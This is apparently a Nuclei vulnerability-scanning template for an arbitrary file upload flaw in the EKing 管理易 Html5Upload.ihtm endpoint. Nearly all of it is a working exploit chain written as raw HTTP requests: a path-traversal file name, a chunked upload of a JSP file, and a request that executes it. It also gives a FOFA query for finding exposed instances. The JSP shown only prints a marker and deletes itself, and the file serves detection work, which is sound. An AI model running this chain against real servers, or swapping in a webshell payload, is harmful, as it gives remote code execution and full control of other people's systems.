id: eking-guanliyi-html5upload_ihtm-file-upload

info:
  name: EKing 管理易 Html5Upload.ihtm 任意文件上传
  author: HuanXiong
  severity: critical
  description: |-
    fofa: app="EKing-管理易"
    EKing 管理易 Html5Upload.ihtm 接口存在文件上传漏洞，攻击者可通过多步骤上传恶意JSP文件实现远程代码执行，可能导致服务器被完全控制。
  reference:
    - 
  tags: rce, file-upload, eking, guanliyi

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |-
        POST /Html5Upload.ihtm HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Connection: close
        
        comm_type=INIT&sign_id=shell&vp_type=default&file_name=../../{{username}}.jsp&file_size=2048

      - |-
        POST /Html5Upload.ihtm HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR
        Connection: close
        
        ------WebKitFormBoundaryj7OlOPiiukkdktZR
        Content-Disposition: form-data; name="comm_type"
        
        DATA
        ------WebKitFormBoundaryj7OlOPiiukkdktZR
        Content-Disposition: form-data; name="sign_id"
        
        {{username}}
        ------WebKitFormBoundaryj7OlOPiiukkdktZR
        Content-Disposition: form-data; name="data_inde"
        
        0
        ------WebKitFormBoundaryj7OlOPiiukkdktZR
        Content-Disposition: form-data; name="data"; filename="chunk1"
        Content-Type: application/octet-stream
        
        <% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
        ------WebKitFormBoundaryj7OlOPiiukkdktZR--

      - |-
        POST /Html5Upload.ihtm HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Connection: close
        
        comm_type=END&sign_id={{username}}&file_name=../../{{username}}.jsp

      - |-
        GET /{{username}}.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36

    matchers:
      - type: dsl
        name: 任意文件上传
        dsl:
          - "status_code == 200 && contains_all(body, 'pboyjnnrfipmplsukdeczudsefxmywe')"